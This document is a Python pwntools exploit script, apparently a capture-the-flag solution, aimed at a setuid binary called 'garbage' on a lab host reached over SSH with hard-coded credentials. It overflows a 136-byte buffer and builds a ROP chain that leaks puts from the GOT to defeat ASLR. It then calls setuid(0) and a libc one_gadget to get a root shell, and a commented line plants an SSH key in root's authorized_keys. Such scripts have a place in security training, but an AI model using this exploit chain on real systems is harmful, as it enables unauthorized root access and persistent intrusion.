from pwn import *

# crash 136
sshConn = ssh(host='10.129.73.80' , user='margo', password='iamgod$08')
p = sshConn.process('garbage')

context(os='linux', arch='amd64')

junk = b"A" * 136		# Use b"..." to create a bytes object

pop_rdi = p64(0x40179b) 	# ropper -f /home/emsec/Desktop/garbage --search "pop r?i"
got_puts = p64(0x404028) 	# objdump -D /home/emsec/Desktop/garbage | grep puts
plt_puts = p64(0x401050)
plt_main = p64(0x401619)


stage_1 = pop_rdi + got_puts + plt_puts + plt_main
p.sendline(junk + stage_1)
p.recvuntil("access denied.\n")
leaked_put = u64(p.recvline()[:8].strip().ljust(8, b'\x00'))
log.success("Leaked puts address: 0x%x" % leaked_put)
p.recvuntil("Enter access password: ")


# offsets
libc_puts    = 0x809c0	#  readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep " puts@@GLIBC"
libc_exec_sh = 0x4f322	# one_gadget gadget garbage 
libc_setuid  = 0xe5970  # readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep " setuid@@GLIBC" 
libc_base    = leaked_put - libc_puts

stage_2 = junk + pop_rdi + p64(0) + p64(libc_setuid + libc_base) + p64(libc_exec_sh + libc_base)
p.sendline(stage_2)
p.recvuntil("access denied.")
#p.sendline('echo "ssh-rsa emsec" >> /root/.ssh/authorized_keys') # put your id_rsa.pub for root ssh 
p.interactive()
